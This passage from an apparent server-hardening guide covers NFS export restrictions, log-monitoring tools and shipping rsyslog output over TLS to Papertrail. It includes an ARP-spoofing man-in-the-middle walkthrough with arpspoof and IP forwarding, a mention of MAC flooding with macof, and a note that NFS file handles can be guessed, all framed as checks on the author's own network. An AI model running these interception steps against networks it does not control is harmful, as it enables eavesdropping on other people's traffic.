You should not need NFS running on a web server. The packages required for the NFS server to be running are nfs-kernel-server, which has a dependency on nfs-common (common to server and clients), which also has a dependency of rpcbind.

NFSv4 (December 2000) no longer requires the [portmap](#vps-countermeasures-disable-remove-services-harden-what-is-left-remove-rpc-portmapper) service. Rpcbind is the replacement.

Issue the following command to confirm that the NFS server is not installed:

{linenos=off, lang=Bash}
    dpkg-query -l '*nfs*'

This may show you that you have nfs-common installed, but ideally you do not want nfs-kernel-server installed. If it is you can just:

{linenos=off, lang=Bash}
    apt-get remove nfs-kernel-server

If you do need NFS running for a file server, the usual files that will need some configuration will be the following:

* `/etc/exports` (Only file required to actually export your shares)
* `/etc/hosts.allow`
* `/etc/hosts.deny`

Check that these files permissions are `644`, owned by `root`, with group of `root` or `sys`.

The above `hosts.[allow | deny]` provide the accessibility options. You really need to lock these down if you intend to use NFS in a somewhat secure fashion.

The [exports](https://linux.die.net/man/5/exports) man page has all the details (and some examples) you need, but I will cover some options here.

In the below example `/dir/you/want/to/export` is the directory (and sub directories) that you want to share, this could also be an entire volume, but keeping these as small as possible is a good start.

{title="/etc/exports", linenos=off, lang=Bash}
    </dir/you/want/to/export>   machine1(option1,optionn) machine2(option1,optionn) machinen(option1,optionn)

`machine1`, `machine2`, `machinen` are the machines that you want to have access to the spescified exported share. These can be specified as their DNS names or IP addresses, using IP addresses can be a little more secure and reliable than using DNS addresses. If using DNS, make sure the names are fully qualified domain names.

Some of the more important options are:

* `ro`: The client will not be able to write to the exported share (this is the default), and I do not use `rw` which allows the client to also write.
* `root_squash`: This prevents remote root users that are connected from also having root privileges, assigning them the user ID of the `nfsnobody`, thus effectively "squashing" the power of the remote user to the lowest privileges possible on the server. Or even better, use `all_squash`.
* From 1.1.0 of `nfs-utils` onwards, `no_subtree_check` is a default. `subtree_check` was the previous default, which would cause a routine to verify that files requested by the client were in the appropriate part of the volume. The `subtree_check` caused more issues than it solved.
* `fsid`: is used to specify the file system that is exported, this could be a UUID, or the device number. NFSv4 clients have the ability to see all of the exports served by the NFSv4 server as a single file system. This is called the NFSv4 pseudo-file system. This pseudo-file system is identified as a [single, real file system](https://www.centos.org/docs/5/html/Deployment_Guide-en-US/s1-nfs-server-config-exports.html#id3077674), identified at export with the `fsid=0` option.
* `anonuid` and `anongid` explicitly set the uid and gid of the anonymous account. This option makes all requests look like they come from a specific user. By default the uid and gid of 65534 is used by exportfs for squashed access. These two options allow us to override the uid and gid values.

The following is one of the configs I have used on several occasions: 

{title="/etc/exports", linenos=off, lang=Bash}
    # Allow read only access to all hosts within subnet to the /dir/you/want/to/export directory
    # as user nfsnobody.
    </dir/you/want/to/export>   10.10.0.0/24(ro,fsid=0,sync,root_squash,no_subtree_check,anonuid=65534,anongid=65534)

Then on top of this sort of configuration, you need to make sure that the local server mounts are as restrictive as we set-up in the ["Lock Down the Mounting of Partitions"](#vps-countermeasures-disable-remove-services-harden-what-is-left-lock-down-the-mounting-of-partitions) section, and also the file permissions for other, at the exported level recursively, are as restrictive as practical for you. Now we are starting to achieve a little defence in depth.

Now if you have been following along with the NFS configuration because you are working on a file server rather than a web server, lets just take this a little further with some changes to `/etc/hosts.deny` and `/etc/hosts.allow`.  
The access control language used in these two files is the same as each other, just that `hosts.deny` is consulted for which entities to deny to which services, and `hosts.allow` for which to allow for the same.

Each line of these two files specifies (in the simplest form) a single service or process and a set of hosts in numeric form (not DNS). In the more complex forms, _daemon@host_ and _user@host_.

You can add `ALL:ALL` to your `hosts.deny`, but if you install a new service that uses these files, then you will be left wondering why it is not working. I prefer to be more explicit, but it is up to you.

{title="/etc/hosts.deny", linenos=off, lang=Bash}
    rpcbind : ALL

{title="/etc/hosts.allow", linenos=off, lang=Bash}
    rpcbind : 10.10.0.10 10.10.0.11 10.10.0.n

    # Or if you are confident you have enough defence in depth
    # and need to open to your network segment:
    rpcbind : 10.10.0.0/24

Prior to NFSv4 to achieve the same results, these two files would need to contain something similar to the following. [NFSv4 has no interaction](https://www.centos.org/docs/5/html/Deployment_Guide-en-US/ch-nfs.html) with these additional daemons, as their functionality has been incorporated into the version 4 protocol and NFS (v4) listens on the well known TCP port 2049:

{title="/etc/hosts.deny", linenos=off, lang=Bash}
    portmap : ALL
    lockd   : ALL
    mountd  : ALL
    rquotad : ALL
    statd   : ALL

{title="/etc/hosts.allow", linenos=off, lang=Bash}
    portmap : 10.10.0.10 10.10.0.11 10.10.0.n
    lockd   : 10.10.0.10 10.10.0.11 10.10.0.n
    mountd  : 10.10.0.10 10.10.0.11 10.10.0.n
    rquotad : 10.10.0.10 10.10.0.11 10.10.0.n
    statd   : 10.10.0.10 10.10.0.11 10.10.0.n

    # Or if you are confident you have enough defence in depth
    # and need to open to your network segment:
    portmap : 10.10.0.0/24
    lockd   : 10.10.0.0/24
    mountd  : 10.10.0.0/24
    rquotad : 10.10.0.0/24
    statd   : 10.10.0.0/24

You can reload your config, that is re-export your exports `/etc/exports` with a restart of NFS:

{linenos=off, lang=Bash}
    service nfs-kernel-server [restart | stop, start]

Although that is not really necessary, a simple

{linenos=off, lang=Bash}
    exportfs -ra

is sufficient. Both exports and exportfs man pages are good for additional insight.

Then run another `showmount` to audit your exports:

{linenos=off, lang=bash}
    showmount -e <target host>

&nbsp;

A client communicates with the servers mount daemon. If the client is authorised, the mount daemon then provides the root file handle of the exported filesystem to the client, at which point the client can send packets referencing the file handle. Making correct guesses of valid file handles can often be easy. The file handles consist of:

1. A filesystem Id (visible in `/etc/fstab` usually world readable, or by running `blkid`).
2. An inode number. For example, the `/` directory on the standard Unix filesystem has the inode number of 2, `/proc` is 1. You can see these with `ls -id <target dir>`
3. A generation count, this value can be a little more fluid, although many inodes such as the `/` are not deleted very often, so the count remains small and reasonably guessable. Using a tool `istat` can provide these details if you want to have a play.

Thus allowing a spoofing type of attack, which has been made more difficult by the following measures:

1. Prior to NFS version 4, UDP could be used, making spoofed requests easier, which allowed an attacker to perform Create, Read, Update, Delete (CRUD) operations on the exported file system(s)
2. By default `exportfs` is run with the `secure` option, requiring that requests originate from a privileged port (<1024). We can see with the following commands that this is the case, so whoever attempts to mount an export must be root.

{linenos=off, lang=bash}
    # From a client:
    netstat -nat | grep <nfs host>
    # Produces:
    tcp 0 0 <nfs client host>:702 <nfs host>:2049 ESTABLISHED

Or with the newer Socket Statistics:

{linenos=off, lang=bash}
    # From a client:
    ss -pn | grep <nfs host>
    # Produces:
    tcp ESTAB 0 0 <nfs client host>:702 <nfs host>:2049

Prior to this spoofing type vulnerability largely being mitigated, one option that was used was to randomise the generation number of every inode on the filesystem using a tool `fsirand`, which was available for some versions of Unix, although not Linux. This made guessing the generation number harder, thus mitigating these spoofing type of attacks. This would usually be scheduled to run say once a month.

`fsirand` would be run on the `/` directory while in single-user mode  
or  
on un-mounted filesystems, run `fsck`, and if no errors were produced, run `fsirand`

{linenos=off, lang=bash}
    umount <filesystem> # /dev/sda1 for example
    fsck <filesystem> # /dev/sda1 for example
    # Exit code of 0 means no errors.
    fsirand <filesystem> # /dev/sda1 for example

### Lack of Visibility {#vps-countermeasures-lack-of-visibility}

**Some Useful Visibility Commands**

Check who is currently logged in to your server and what they are doing:  
`who` and `w`  

Check who has recently logged into your server, I mentioned this command previously:  
`last -ad`

Check which user has failed login attempts, mentioned this command previously:  
`lastb -ad`

Check the most recent login of all users, or of a given user. `lastlog` sources data from the binary file:  
`/var/log/lastlog`  
`lastlog`

#### Logging and Alerting {#vps-countermeasures-lack-of-visibility-logging-and-alerting}
![](images/ThreatTags/PreventionEASY.png)

%% This section is also linked to from the "Insufficient Logging and Monitoring" section in web applications.

I recently performed an [in-depth evaluation](#vps-countermeasures-lack-of-visibility-web-server-log-management) of a small collection of logging and alerting offerings, the choice of which candidates to bring into the in-depth evaluation came from an [initial evaluation](#vps-countermeasures-lack-of-visibility-logging-and-alerting-initial-evaluation).

It is very important to make sure you have reliable and all-encompassing logging to an off-site location. This way attackers will have to also compromise that location in order to effectively [cover their tracks](http://www.win.tue.nl/~aeb/linux/hh/hh-13.html).

You can often see in logs when access has been granted to an entity, when files have been modified or removed. Become familiar with what your logs look like and which events create which messages. A good sys-admin can sight logs and quickly see anomalies. If you keep your log aggregator open at least when ever you are working on the servers that generate the events, you will quickly get used to recognising which events cause which log entries.

Alerting events should also be set-up for expected, unexpected actions and a dead man's snitch.

Make sure you have reviewed who can [write and read](http://www.tldp.org/HOWTO/Security-HOWTO/secure-prep.html#logs) your logs, especially those created by the `auth` facility, and make any modifications necessary to the permissions.

In order to have logs that provide the information you need, you need to make sure the logging level is set to produce the required amount of verbosity. That time stamps are synchronised across your network. That you archive the logs for long enough to be able to diagnose malicious activity and movements across the network.

Being able to rely on the times of events on different network nodes is essential to making sense of tracking an attackers movements through your network. I discuss setting up Network Time Protocol (NTP) on your networked machines in the [Network](#network-countermeasures-fortress-mentality-insufficient-logging-ntp) chapter.

{#vps-countermeasures-lack-of-visibility-logging-and-alerting-initial-evaluation}
* [Simple Log Watcher](https://sourceforge.net/projects/swatch/)  
Or as it used to be called before being asked to change its name from Swatch (Simple Watchdog), by the Swiss watch company, is a pearl script that monitors “a” log file for each instance you run (or schedule), matches your defined regular expression patterns based on the configuration file which defaults to `~/.swatchrc` and performs any action you can script. You can define different message types with different font styles and colours. Simple Log Watcher can tail the log file, so your actions will be performed in real-time.  
  
Each log file you want to monitor, you need a separate `swatchrc` file and a separate instance of Simple Log Watcher, as it only takes one file argument. If you want to monitor a lot of log files without aggregating them, this could get messy.  
  
See the [Additional Resources](#additional-resources-vps-countermeasures-lack-of-visibility-logging-and-alerting-swatch) chapter.  
  
* [Logcheck](https://packages.debian.org/stretch/logcheck)  
Monitors system log files, and emails anomalies to an administrator. Once [installed](https://linuxtechme.wordpress.com/2012/01/31/install-logcheck/) it needs to be set-up to run periodically with cron, so it is not a real-time monitor, which may significantly reduce its usefulness in catching an intruder before they obtain their goal, or get a chance to modify the logs that logcheck would review. The Debian Manuals have [details](https://www.debian.org/doc/manuals/securing-debian-howto/ch4.en.html#s-custom-logcheck) on how to use and customise logcheck. Most of the configuration is stored in `/etc/logcheck/logcheck.conf`. You can specify which log files to review within the `/etc/logcheck/logcheck.logfiles`. Logcheck is easy to install and configure.  
  
* [Logwatch](https://packages.debian.org/stretch/logwatch)  
Similar to Logcheck, monitors system logs, not continuously, so they could be open to modification before Logwatch reviews them, thus rendering Logwatch infective. Logwatch targets a similar space to Simple Log Watcher and Logcheck from above, it can review all logs within a certain directory, all logs from a specified collection of services, and single log files. Logwatch creates a report of what it finds based on your level of paranoia and can email to the sys-admin. It is easy to set-up and get started though. Logwatch is available in the debian repositories and the [source](https://sourceforge.net/p/logwatch/git/ci/master/tree/) is available on SourceForge.  
  
* [Logrotate](https://packages.debian.org/stretch/logrotate)  
Use [logrotate](http://www.rackspace.com/knowledge_center/article/understanding-logrotate-utility) to make sure your logs will be around long enough to examine them. There are some usage examples  
here: [http://www.thegeekstuff.com/2010/07/logrotate-examples/](http://www.thegeekstuff.com/2010/07/logrotate-examples/). Ships with Debian. It is just a matter of reviewing the default configuration and applying any extra config that you require specifically.  
  
* [Logstash](https://www.elastic.co/products/logstash)  
Targets a similar problem to logrotate, but goes a lot further in that it routes and has the ability to translate between protocols. Logstash has a rich plugin ecosystem, with integrations provided by both the creators (Elastic) and the open source community. As per the above offerings, Logstash is FOSS. One of the main disadvantages I see is that Java is a dependency.  
  
* [Fail2ban](http://www.fail2ban.org/wiki/index.php/Main_Page)  
Ban hosts that cause multiple authentication errors, or just email events. Of course you need to think about false positives here also. An attacker can spoof many IP addresses potentially causing them all to be banned, thus creating a DoS. Fail2ban has been around for at least 12 years, is actively maintained and written in [Python](https://github.com/fail2ban/fail2ban/). There is also a web UI written in NodeJS called [fail2web](https://github.com/Sean-Der/fail2web).  
  
* [Multitail](https://packages.debian.org/stretch/multitail)  
Does what its name says. Tails multiple log files at once and shows them in a terminal. Provides real-time multi log file monitoring. Great for seeing strange happenings before an intruder has time to modify logs, if you are watching them that is. Good for a single or small number of systems if you have spare screens to fix to the wall.  
  
* [PaperTrail](https://papertrailapp.com/)  
Targets a similar problem to MultiTail, except that it collects logs from as many servers as you want, and streams them off-site to PaperTrails service, then aggregates them into a single easily searchable web interface, allowing you to set-up alerts on any log text. PaperTrail has a free plan providing 100MB per month, which is enough for some purposes. The plans are reasonably cheap for the features it provides, and can scale as you grow. I have used this in production environments (as discussed soon), and have found it to be a tool that does not try to do to much, and does what it does well.

#### Web Server Log Management {#vps-countermeasures-lack-of-visibility-web-server-log-management}
![](images/ThreatTags/PreventionAVERAGE.png)

##### System Loggers Reviewed

**GNU syslogd**

Which I am unsure of whether it is being actively developed. Most GNU/Linux distributions no longer ship with this. Only supports UDP. It is also lacking in features. From what I gather is single-threaded. I did not spend long looking at this as there was not much point. The following two offerings are the main players currently.

**Rsyslog**

Which ships with Debian and most other GNU/Linux distributions now. I like to do as little as possible to achieve goals, and rsyslog fits this description for me. The [rsyslog documentation](http://www.rsyslog.com/doc/master/index.html) is good. Rainer Gerhards wrote rsyslog and his [blog](http://blog.gerhards.net/2007/08/why-does-world-need-another-syslogd.html) provides many good insights into all things system logging. Rsyslog Supports UDP, TCP, TLS. There is also the Reliable Event Logging Protocol (RELP) which Rainer created. Rsyslog is great at gathering, transporting, storing log messages and includes some really neat functionality for dividing the logs. It is not designed to alert on logs. That is where the likes of Simple Event Correlator ([SEC](http://www.gossamer-threads.com/lists/rsyslog/users/6044)) comes in, as discussed [below](#vps-countermeasures-lack-of-visibility-web-server-log-management-improving-the-strategy). Rainer Gerhards discusses why TCP is not as reliable as many [think](http://blog.gerhards.net/2008/04/on-unreliability-of-plain-tcp-syslog.html).

**Syslog-ng**

I did not spend to long here, as I did not see any features that I needed that were better than the default of rsyslog. Syslog-ng can correlate log messages, both real-time and off-line, supports reliable and encrypted transport using TCP and TLS. message filtering, sorting, pre-processing, log normalisation.

##### Aims

* Record events and have them securely transferred to another syslog server in real-time, or as close to it as possible, so that potential attackers do not have time to modify them on the local system before they are replicated to another location
* Reliability: Resilience / ability to recover connectivity. No messages lost.
* Privacy: Log messages should not be able to be read in transit.
* Integrity: Log messages should not be able to be tampered with / modified in transit. Integrity on the file-system is covered in other places in this chapter, such as in sections "[Partitioning on OS Installation](#vps-countermeasures-disable-remove-services-harden-what-is-left-partitioning-on-os-installation)" and "[Lock Down the Mounting of Partitions](#vps-countermeasures-disable-remove-services-harden-what-is-left-lock-down-the-mounting-of-partitions)"
* Extensibility: ability to add more machines and be able to aggregate events from many sources on [many machines](#network-countermeasures-lack-of-visibility-insufficient-logging).
* Receive notifications from the upstream syslog server of specific events. No [Host Intrusion Detection System (HIDS)](#vps-countermeasures-lack-of-visibility-host-intrusion-detection-systems-hids) is going to remove the need to reinstall your system if you are not notified in time and an attacker plants and activates their root-kit.
* Receive notifications from the upstream syslog server of lack of events. If you expect certain events to usually occur, but they have stopped, and you want to know about it.

##### Environmental Considerations {#vps-countermeasures-lack-of-visibility-web-server-log-management-environmental-considerations}

You may have devices in your network topology such as routers, switches, access points (APs) that do not have functionality to send their system logs via TCP, opting to rely on an unreliable transport such as UDP, often also not supporting any form of confidentiality. As this is not directly related to VPS, I will defer this portion to the [Insufficient Logging](#network-countermeasures-lack-of-visibility-insufficient-logging) countermeasures section within the Network chapter.

##### Initial Set-Up {#vps-countermeasures-lack-of-visibility-web-server-log-management-initial-set-up}

%% This section is also linked to from the "Insufficient Logging and Monitoring" section in web applications.

Rsyslog using TCP, local queuing over TLS to papertrail for your syslog collection, aggregating and reporting server. Papertrail does not support RELP, but say that is because their clients have not seen any issues with reliability in using plain TCP over TLS with local queuing. I must have been the first then. Maybe I am the only one that actually compares what is being sent against what is being received.

As I was setting this up and watching both ends. We had an internet outage of just over an hour. At that stage we had very few events being generated, so it was trivial to verify both ends after the outage. I noticed that once the ISPs router was back on-line and the events from the queue moved to papertrail, that there was in fact one missing.

Why did Rainer Gerhards create RELP if TCP with queues was good enough? That was a question that was playing on me for a while. In the end, it was obvious that TCP without RELP is not good enough if you want your logs to have the quality of integrity. At this stage it looks like the queues may loose messages. Rainer Gerhards [said](http://ftp.ics.uci.edu/pub/centos0/ics-custom-build/BUILD/rsyslog-3.19.8/doc/rsyslog_reliable_forwarding.html) “_In rsyslog, every action runs on its own queue and each queue can be set to buffer data if the action is not ready. Of course, you must be able to detect that the action is not ready, which means the remote server is off-line. This can be detected with plain TCP syslog and RELP_“, so it can be detected without RELP.

You can [aggregate](http://help.papertrailapp.com/kb/configuration/advanced-unix-logging-tips/#rsyslog_aggregate_log_files) log files with rsyslog or by using papertrails `remote_syslog` daemon.

Alerting is available, including for [inactivity of events](http://help.papertrailapp.com/kb/how-it-works/alerts/#inactivity).

Papertrails documentation is good and support is reasonable. Due to the huge amounts of traffic they have to deal with, they are unable to trouble-shoot any issues you may have. If you still want to go down the papertrail path, to get started, work through ([https://papertrailapp.com/systems/setup](https://papertrailapp.com/systems/setup)) which sets up your rsyslog to use UDP (specified in the `/etc/rsyslog.conf` by a single ampersand in front of the target syslog server). I wanted something more reliable than that, so I use two ampersands, which specifies TCP.

As we are going to be sending our logs over the internet for now, we need TLS, check papertrails "[Encrypting with TLS](http://help.papertrailapp.com/kb/configuration/encrypting-remote-syslog-with-tls-ssl/#rsyslog)" docs. Check papertrails CA server bundle for integrity:

{linenos=off, lang=bash}
    curl https://papertrailapp.com/tools/papertrail-bundle.pem | md5sum

Should result in what ever it says on papertrails "Encrypting with TLS" page. First problem here: the above mentioned page that lists the MD5 checksum is being served unencrypted, even if you force the use of `https` I get an invalid certificate error. My advice would be to contact papertrail directly and ask them what the MD5 checksum should be. Make sure it is the same as what the above command produces.

If it is, put the contents of that URL into a file called `papertrail-bundle.pem`, then [`scp`](https://blog.binarymist.net/2012/03/25/copying-with-scp/) the `papertrail-bundle.pem` into the web servers `/etc` dir. The command for that will depend on whether you are already on the web server and you want to pull, or whether you are somewhere else and want to push. Then make sure the ownership is correct on the pem file.

{linenos=off, lang=bash}
    chown root:root papertrail-bundle.pem

install `rsyslog-gnutls`:

{linenos=off, lang=bash}
    apt-get install rsyslog-gnutls

Add the TLS config:

{linenos=off, lang=bash}
    $DefaultNetstreamDriverCAFile /etc/papertrail-bundle.pem # trust these CAs
    $ActionSendStreamDriver gtls # use gtls netstream driver
    $ActionSendStreamDriverMode 1 # require TLS
    $ActionSendStreamDriverAuthMode x509/name # authenticate by host-name
    $ActionSendStreamDriverPermittedPeer *.papertrailapp.com

to your `/etc/rsyslog.conf`. Create egress rule for your router to let traffic out to destination port `39871`.

{linenos=off, lang=bash}
    sudo service rsyslog restart

To generate a log message that uses your system syslogd config `/etc/rsyslog.conf`, run:

{linenos=off, lang=bash}
    logger "hi"

Should log “`hi`” to `/var/log/messages` and also to [https://papertrailapp.com/events](https://papertrailapp.com/events), but it was not.

**Time to Trouble-shoot**

Let us keep an eye on `/var/log/messages`, where our log messages should be written to for starters. In one terminal run the following:

{linenos=off, lang=bash}
    # Show a live update of the last 10 lines (by default) of /var/log/messages
    sudo tail -f [-n <number of lines to tail>] /var/log/messages

OK, so lets run rsyslog in config checking mode:

{linenos=off, lang=bash}
    /usr/sbin/rsyslogd -f /etc/rsyslog.conf -N1

If the config is OK, the output will look like:

{linenos=off, lang=bash}
    rsyslogd: version <the version number>, config validation run (level 1), master config /etc/rsyslog.conf
    rsyslogd: End of config validation run. Bye.

Some of the trouble-shooting resources I found were:

1. [https://www.loggly.com/docs/troubleshooting-rsyslog/](https://www.loggly.com/docs/troubleshooting-rsyslog/)
2. [http://help.papertrailapp.com/](http://help.papertrailapp.com/)
3. [http://help.papertrailapp.com/kb/configuration/troubleshooting-remote-syslog-reachability/](http://help.papertrailapp.com/kb/configuration/troubleshooting-remote-syslog-reachability/)
4. `/usr/sbin/rsyslogd -version` will provide the installed version and supported features.

The papertrail help was not that helpful, as we do not, and should not have telnet installed, we removed it [remember](#vps-countermeasures-disable-remove-services-harden-what-is-left-remove-telnet)? I can not ping from the DMZ as ICMP egress is not white-listed and I am not going to install tcpdump or strace on a production server. The more you have running, the more surface area you have, the greater the opportunities for exploitation, good for attackers, bad for defenders.

So how do we tell if rsyslogd is actually running if it does not appear to be doing anything useful?

{linenos=off, lang=bash}
    pidof rsyslogd
    # or
    /etc/init.d/rsyslog status

Showing which files rsyslogd has open can be useful:

{linenos=off, lang=bash}
    lsof -p <rsyslogd pid>
    # or just combine the results of pidof rsyslogd:
    sudo lsof -p $(pidof rsyslogd)

To start with, produced output like:

{linenos=off, lang=bash}
    rsyslogd 3426 root 8u IPv4 9636 0t0 TCP <your server IP>:<sending port>->logs2.papertrailapp.com:39871 (SYN_SENT)

Which obviously showed rsyslogds `SYN` packets were not getting through. I had some discussion with Troy from papertrail support around the reliability of plain TCP over TLS without RELP. I think if the server is business critical, then [Improving the Strategy](#vps-countermeasures-lack-of-visibility-web-server-log-management-improving-the-strategy) maybe required. Troy assured me that they had never had any issues with logs being lost due to lack of reliability with out RELP. Troy also pointed me to their recommended [local queue options](http://help.papertrailapp.com/kb/configuration/advanced-unix-logging-tips/#rsyslog_queue). After adding the queue tweaks and a rsyslogd restart, the above command now produced output like:

{linenos=off, lang=bash}
    rsyslogd 3615 root 8u IPv4 9766 0t0 TCP <your server IP>:<sending port>->logs2.papertrailapp.com:39871 (ESTABLISHED)

I could now see events in the papertrail web UI in real-time.

Socket Statistics (`ss`) (the better `netstat`) should also show the established connection.

By default papertrail accepts TCP over TLS (TLS encryption check-box on, Plain text check-box off) and UDP. So if your TLS is not set-up properly, your events will not be accepted by papertrail. This is how I confirmed this to be true:

**Confirm that our Logs are Commuting over TLS**

Now without installing anything on the web server or router, or physically touching the server sending packets to papertrail, or the router. Using a switch (ubiquitous) rather than a hub. No wire tap or multi-network interfaced computer. No switch monitoring port available on expensive enterprise grade switches (along with the much needed access). I was basically down to two approaches I could think of, and I like to achieve as much as possible with as little amount of effort as possible, so could not be bothered getting out of my chair and walking to the server rack.

1. MAC flooding with the help of [macof](http://linux.die.net/man/8/macof) which is a utility from the dsniff suite. This essentially causes your switch to go into a “failopen mode” where it acts like a hub and broadcasts its packets to every port.  
    
    ![](images/MItMMACFlod.png)  
    
2. Man In the Middle (MItM) with some help from [ARP spoofing](#network-identify-risks-spoofing-website) or [poisoning](http://thevega.blogspot.co.nz/2008_06_01_archive.html). I decided to choose the second option, as it is a little more elegant.  
    
    ![](images/MItMARPSpoof.png)

On our MItM box, I set a static `IP`: `address`, `netmask`, `gateway` in `/etc/network/interfaces` and add `domain`, `search` and `nameservers` to the `/etc/resolv.conf`.

Follow that up with a `service network-manager restart`.

On the web server, run: `ifconfig -a` to get MAC: `<your server MAC>`.

On MItM box, run the same command, to get MAC: `<MItM box MAC>`.

On web server, run: `ip neighbour` to find MAC addresses associated with IP addresses (the local ARP table). Router will be: `<router MAC>`.

{linenos=off, lang=bash}
    you@your_server:~$ ip neighbour
    <MItM box IP> dev eth0 lladdr <MItM box MAC> REACHABLE
    <router IP> dev eth0 lladdr <router MAC> REACHABLE

Now you need to turn your MItM box into a router temporarily. On the MItM box run:

{linenos=off, lang=bash}
    cat /proc/sys/net/ipv4/ip_forward

If forwarding is on, You will see a `1`. If it is not, add a `1` into the file:

{linenos=off, lang=bash}
    echo 1 > /proc/sys/net/ipv4/ip_forward

and check again to make sure forwarding is on. Now on the MItM box run:

{linenos=off, lang=bash}
    arpspoof -t <your server IP> <router IP>

This will continue to notify `<your server IP>` that our MItM box MAC address belongs to `<router IP>`. For all intents and purposes, we (MItM box) are now `<router IP>` to the `<your server IP>` box, but our IP address does not change. Now on the web server you can see that its ARP table has been updated and because `arpspoof` keeps running, it keeps telling `<your server IP>` that our MItM box is the router.

{linenos=off, lang=bash}
    you@your_server:~$ ip neighbour
    <MItM box IP> dev eth0 lladdr <MItM box MAC> STALE
    <router IP> dev eth0 lladdr <MItM box MAC> REACHABLE

Now on our MItM box, while our `arpspoof` continues to run, we [start Wireshark](https://blog.binarymist.net/2013/04/13/running-wireshark-as-non-root-user/) listening on our `eth0` interface or what ever interface you are bound to, and you can see that all packets that the web server is sending, we are intercepting and forwarding (routing) on to the gateway.

Now Wireshark clearly showed that the data was encrypted. I commented out the five TLS config lines in the `/etc/rsyslog.conf` file -> saved -> restarted rsyslog -> turned on “Plain text” in papertrail and could now see the messages in clear text. Now when I turned off “Plain text”, papertrail would no longer accept syslog events. Excellent!

One of the nice things about `arpspoof` is that it re-applies the original ARP mappings once it is done.

You can also tell `arpspoof` to poison the routers ARP table. This way any traffic going to the web server via the router, not originating from the web server will be routed through our MItM box also.

Do not forget to revert the change to `/proc/sys/net/ipv4/ip_forward`.

**Exporting Wireshark Capture**

You can use the File->Save As… option here for a collection of output types, or the way I usually do it is:

1. First completely expand all the frames you want visible in your capture file
2. File -> Export Packet Dissections -> as “Plain Text” file
3. Check the “All packets” check-box
4. Check the “Packet summary line” check-box
5. Check the “Packet details:” check-box and the “As displayed”
6. OK

**Trouble-shooting Messages that papertrail Never Shows**

A> To run rsyslogd in [debug](http://www.rsyslog.com/doc/v5-stable/troubleshooting/troubleshoot.html#debug-log)

Check to see which arguments get passed into rsyslogd to run as a daemon in `/etc/init.d/rsyslog` and `/etc/default/rsyslog`. You will probably see a `RSYSLOGD_OPTIONS=""`. There may be some arguments between the quotes.

{linenos=off, lang=bash}
    sudo service rsyslog stop
    sudo /usr/sbin/rsyslogd [your options here] -dn >> ~/rsyslog-debug.log

The debug log can be quite useful for trouble-shooting. Also keep your eye on the stderr as you can see if it is writing anything out (most system start-up scripts throw this away). Once you have finished collecting log: [CTRL]+[C]

{linenos=off, lang=bash}
    sudo service rsyslog start

To see if rsyslog is running:

{linenos=off, lang=bash}
    pidof rsyslogd
    # or
    /etc/init.d/rsyslog status

A> Turn on the [impstats](http://www.rsyslog.com/doc/master/configuration/modules/impstats.html) module

The stats it produces show when you run into errors with an output, and also the state of the queues. You can also run impstats on the receiving machine if it is in your control. Papertrail obviously is not. Put the following into your `rsyslog.conf` file at the top and restart rsyslog:

{linenos=off, lang=bash}
    # Turn on some internal counters to trouble-shoot missing messages
    module(load="impstats"
    interval="600"
    severity="7"
    log.syslog="off"
     
    # need to turn log stream logging off
    log.file="/var/log/rsyslog-stats.log")
    # End turn on some internal counters to trouble-shoot missing messages

Now if you get an error like:

{linenos=off, lang=bash}
    rsyslogd-2039: Could not open output pipe '/dev/xconsole': No such file or directory [try http://www.rsyslog.com/e/2039 ]

You can just change the `/dev/xconsole` to `/dev/console`. Xconsole is still in the config file for legacy reasons, it has not been cleaned up by the package maintainers.

A> GnuTLS error in rsyslog-debug.log

By running rsyslogd manually in debug mode, I found an error when the message failed to send:

{linenos=off, lang=bash}
    unexpected GnuTLS error -53 in nsd_gtls.c:1571

Standard Error when running rsyslogd manually produces:

{linenos=off, lang=bash}
    GnuTLS error: Error in the push function

With some help from the GnuTLS mailing list:

“_That means that send() returned -1 for some reason._” You can enable more output by adding an environment variable `GNUTLS_DEBUG_LEVEL=9` prior to running the application, and that should at least provide you with the `errno`. This does not provide any more detail to stderr. However, [thanks to Rainer](https://github.com/rsyslog/rsyslog/issues/219) we do now have [debug.gnutls parameter](https://github.com/jgerhards/rsyslog/commit/9125ddf99d0e5b1ea3a15a730fc409dd27df3fd9) in the rsyslog code, that if you specify this global variable in the `rsyslog.conf` and assign it a value between 0-10 you will have gnutls debug output going to rsyslog’s debug log.

##### Improving the Strategy {#vps-countermeasures-lack-of-visibility-web-server-log-management-improving-the-strategy}

With the above strategy, I had issues where messages were getting lost between rsyslog and papertrail, I spent over a week trying to find the cause. As the sender, you have no insight into what papertrail is doing. The support team could not provide much insight into their service when I had to trouble-shoot things. They were as helpful as they could be though.

Reliability can be significantly improved by using RELP. Papertrail does not support RELP, so a next step could be to replace papertrail with a local network instance of an rsyslogd collector and Simple Event Correlator ([SEC](https://simple-evcorr.github.io/)). Notification for inactivity of events could be performed by cron and SEC. Then for all your graphical event correlation, you could use [LogAnalyzer](http://loganalyzer.adiscon.com/), also created by Rainer Gerhards (rsyslog author). This would be more work to set-up than an on-line service you do not have to set-up. In saying that. You would have greater control and security which for me is the big win here.
[Normalisation](http://www.liblognorm.com/) also from Rainer could be useful.

Another option instead of going through all the work of having to set-up and configure a local network instance of an rsyslogd collector, SEC and perhaps LogAnalyzer, would be to just deploy the SyslogAppliance which is a turn-key VM already configured with all the tools you would need to collect, aggregate, report and alert, as discussed in the Network chapter under Countermeasures, [Insufficient Logging](#network-countermeasures-lack-of-visibility-insufficient-logging).

What I found, is that after several upgrades to rsyslog, the reliability issues seemed to improve, making me think that changes to rsyslog were possibly and probably responsible.

#### Proactive Monitoring {#vps-countermeasures-lack-of-visibility-proactive-monitoring}
![](images/ThreatTags/PreventionAVERAGE.png)

I recently performed an in-depth evaluation of a collection of tools, that one of their responsibilities was monitoring and performing actions on your processes and applications based on some other event(s). Some of these tools are very useful for security focussed tasks as well as generic dev-ops.

**New Relic**

New Relic is a Software as a Service (SaaS) provider that offers many products, primarily in the performance monitoring space, rather than security. Their offerings cost money, but may come into their own in larger deployments. I have used New Relic, it has been quick to start getting useful performance statistics on servers and helped my team isolate resource constraints.

**Advanced Web Statistics ([AWStats](http://www.awstats.org/))**

Unlike NewRelic which is SaaS, AWStats is FOSS. It kind of fits a similar market space as NewRelic though. You can find the documentation  
here: [http://www.awstats.org/docs/index.html](http://www.awstats.org/docs/index.html).

**Pingdom**

Similar to New Relic but not as feature rich. As discussed below, [Monit](http://slides.com/tildeslash/monit#/7) is a better alternative.

&nbsp;

